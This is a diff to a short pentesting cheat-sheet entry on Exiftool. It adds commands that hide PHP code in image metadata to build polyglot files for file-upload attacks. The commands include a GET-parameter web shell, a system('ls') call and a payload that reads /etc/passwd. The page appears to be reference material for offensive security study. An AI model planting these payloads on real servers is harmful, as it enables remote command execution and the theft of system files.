@@ -1,8 +1,8 @@
 ---
 title: Exiftool
 desc: Read and write meta information in files. It’s also used to create a polyglot. 
-tags: [Steganography]
-alts: [Binwalk, Steghide, Stegseek, Xxd, Zsteg]
+tags: [FileUpload, ReverseShell, Steganography]
+alts: [Binwalk, FileUploadVulnerabilities, Steghide, Stegseek, Xxd, Zsteg]
 website:
 render_with_liquid: false
 ---
@@ -22,6 +22,10 @@ exiftool example.jpg
 
 ## Create A Polyglot
 
+It's assumed that you have an image file.
+
 ```sh
+exiftool -Comment="<?php system('ls'); ?>" example.png
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' exploit.png
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" example.jpg -o polyglot.php
 ```
